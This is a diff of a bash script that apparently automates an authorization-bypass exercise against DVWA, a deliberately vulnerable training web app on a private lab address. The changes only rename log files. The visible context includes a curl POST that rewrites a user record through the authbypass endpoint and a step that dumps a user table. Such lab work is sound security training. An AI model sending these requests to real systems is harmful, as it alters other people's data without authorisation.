@@ -42,7 +42,7 @@ else
     echo "Result: ACCESS DENIED"
     echo "Admin functionality not accessible"
 fi
-}> /home/kali/auth_bypass.log
+}> /home/kali/auth_bypass1.log
 
 
 
@@ -64,7 +64,7 @@ else
     echo "User Table:"
     echo "$RESPONSE" | jq -r '.[] | "\(.user_id)\t\(.first_name)\t\(.surname)"' | column -t
 fi
-} > /home/kali/user_data.log
+} > /home/kali/auth_bypass2.log
 
 
 
@@ -81,4 +81,4 @@ curl -s -X POST \
   -d '{"id":3,"first_name":"Hack","surname":"Successful"}' \
   http://192.168.56.105/DVWA/vulnerabilities/authbypass/change_user_details.php \
   | jq -r '"Result: " + .result'
-} > /home/kali/change_user.log
+} > /home/kali/auth_bypass3.log
